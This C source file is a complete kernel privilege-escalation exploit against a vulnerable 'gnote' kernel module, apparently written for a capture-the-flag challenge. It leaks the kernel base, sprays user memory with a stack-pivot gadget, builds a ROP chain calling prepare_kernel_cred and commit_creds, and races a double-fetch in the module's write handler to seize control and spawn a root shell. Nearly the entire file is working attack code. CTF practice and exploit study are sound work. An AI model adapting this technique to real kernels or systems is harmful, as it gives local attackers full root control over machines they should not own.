#include <stdio.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/ipc.h>
#include <sys/shm.h>
//multi-thread
#include <pthread.h>
#include <fcntl.h>
#include <stdbool.h>
#include <signal.h>

unsigned long user_cs, user_ss, user_rflags, user_sp;
void save_state(){
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
    puts("[*] Saved state");
}

void get_shell(){
    puts("[*] Returned to userland");
    if (getuid() == 0){
        printf("[*] UID: %d, got root!\n", getuid());
        system("/bin/sh");
    } else {
        printf("[!] UID: %d, didn't get root\n", getuid());
        exit(-1);
    }
}

unsigned int G_race_buffer[2];
bool G_race_condition = true;
__attribute__((fastcall,noinline)) void * race_thread(void * race_data) {
    while(G_race_condition) {
        G_race_buffer[0] = (unsigned long)race_data;
    }
}


/* debug
gdb -q -ex "set architecture i386:x86-64:intel" -ex "target remote localhost:3234" -ex='b * 0xffffffffc000005d' -ex='add-symbol-file ./gnote.ko 0xffffffffc0000000'

gdb -q -ex "set architecture i386:x86-64:intel" -ex "target remote localhost:3234" -ex='b * 0xffffffff81000000+0x001dd06' -ex='add-symbol-file ./gnote.ko 0xffffffffc0000000'
*/

void test_leaked() { //0x20 ?
    char buf[10];
    int victim = open("/proc/self/stat", O_RDONLY);
    if(-1 == victim) {
        perror("[!] test_leaked open");
    }
    read(victim, buf, 1); // call start
    close(victim);
}

int main(int argc, char **argv[]) {
    signal(SIGSEGV,get_shell);
    save_state();
    int fd = open("/proc/gnote", O_RDWR);
    if(-1 == fd) {
        perror("[!] gnote open");
    }

    printf("[+] start poc");

    test_leaked();

    // try Get the leak
    unsigned int buuff[2];
    buuff[0] = 1;
    buuff[1] = 0x20;
    write(fd, buuff, sizeof(buuff));


    //read
    buuff[0] = 5;
    buuff[1] = 0;
    write(fd, buuff, sizeof(buuff));
    
    unsigned long tod_read_data[4] = {0};
    read(fd, tod_read_data, 0x20);

    printf("[+] leak-data -> \n %lx \n %lx \n %lx \n %lx \n", tod_read_data[0],  tod_read_data[1], tod_read_data[2], tod_read_data[3]);

    unsigned long kernel_base = tod_read_data[1]  & 0xfffffffffff00000 - 0x100000;
    printf("[*] kernel base - %lx\n", kernel_base);


    //0xffffffff81254075 : mov esp, 0x5b000000 ; pop r12 ; pop rbp ; ret
    unsigned long target_jump = kernel_base + 2441333;
    printf("[*] kernel jump - %lx\n", target_jump);


    printf("[+] building ROP");
    unsigned long *fake_stack;
    fake_stack = mmap((void *)0x5b000000 - 0x1000, 0x2000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANONYMOUS|MAP_PRIVATE|MAP_FIXED, -1, 0);
    unsigned off = 0x1000 / 8;
    fake_stack[0] = 0xdead; // put something in the first page to prevent fault
    fake_stack[off++] = 0x0; // r12
    fake_stack[off++] = 0x0; // rbp
    fake_stack[off++] = kernel_base+0x001c20d; //pop rdi; ret
    fake_stack[off++] = 0x0;
    fake_stack[off++] = kernel_base+0x0069fe0; //prepare_kernel_cred
    fake_stack[off++] = kernel_base+0x21ca6a;  //cmp rcx, rsi ; mov rdi, rax ; ja 0xffffffff8121ca66 ; pop rbp ; ret
    fake_stack[off++] = 0x0;
    fake_stack[off++] = kernel_base+0x0069df0; //commit_cred
    fake_stack[off++] = kernel_base+0x003efc4; //swapgs ; pop rbp ; ret
    fake_stack[off++] = 0x0;
    fake_stack[off++] = kernel_base+0x001dd06; //iretq
    fake_stack[off++] = ((size_t)get_shell);
    fake_stack[off++] = user_cs;
    fake_stack[off++] = user_rflags;
    fake_stack[off++] = user_sp;
    fake_stack[off++] = user_ss;
    
    /*
    计算mmap范围：

    起始 0xffffffffc0000000 -> 0xffffffffc0FFF000
    目标 0x2000000 ~ 0x3000000
    >>> hex(0x10000000002000000-0xffffffffc0000000)
    '0x42000000'
    >>> hex(0x42000000//8)
    '0x8400000'
    */
    printf("[+] goto kernel spary");
    unsigned long* heap_spary = mmap((void*)0x2000000, 0x1000000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0);
    
    for (int i = 0x98/8; i < 0x1000000/8; i+=0x1000/8) {
        heap_spary[i] = target_jump;
    }


    //race
    printf("[+] goto race");
    pthread_t thr;
    pthread_create(&thr, 0, race_thread, (void *)0x8400000);
    G_race_buffer[0] = 0;
    G_race_buffer[1] = 0;    
    
    for (int i = 0; i < 0x100000; i++) {
        G_race_buffer[0] = 0;
        write(fd, G_race_buffer, sizeof(G_race_buffer));
    }
    G_race_condition = false;

    printf("[+] The END \n");
    return 0;
}
